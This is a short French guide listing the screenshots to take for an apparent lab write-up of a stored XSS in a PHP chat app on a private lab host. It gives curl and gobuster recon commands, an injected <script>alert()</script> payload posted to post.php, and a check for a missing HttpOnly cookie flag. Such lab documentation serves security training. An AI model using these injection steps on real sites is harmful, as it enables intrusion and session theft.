# Captures — Chat App XSS stockée (MS3)

Consignes de capture pour `services/ms3-chat-xss.html`. Commandes identiques à celles du
write-up source : `ms3/jules/chat-xss.md`.

## 01-recon-source.png

```bash
curl -s http://172.28.128.3/chat/
```

Encadrer en rouge : le commentaire `This application was downloaded from the following,
and modified:`.

## 02-decouverte-endpoints.png

```bash
gobuster dir -u http://172.28.128.3/chat/ -w /usr/share/wordlists/dirb/common.txt -x php -q
curl -s -c cookies.txt -b cookies.txt -L -X POST http://172.28.128.3/chat/index.php -d "name=testuser&enter=Enter"
```

Encadrer en rouge : `post.php` dans le résultat gobuster, et le bloc JavaScript
(`$.post("post.php", {text: clientmsg})` et `url: "read_log.php"`) dans la page révélée.

## 03-xss-stockee.png

```bash
curl -s -b cookies.txt -X POST http://172.28.128.3/chat/post.php --data-urlencode "text=<script>alert('XSS-PoC-testuser')</script>"
curl -s -b cookies.txt http://172.28.128.3/chat/read_log.php
curl -sI http://172.28.128.3/chat/index.php | grep -i set-cookie
```

Encadrer en rouge : le tag `<script>` non échappé dans la sortie de `read_log.php`, et
l'absence de `HttpOnly` dans le `Set-Cookie`.
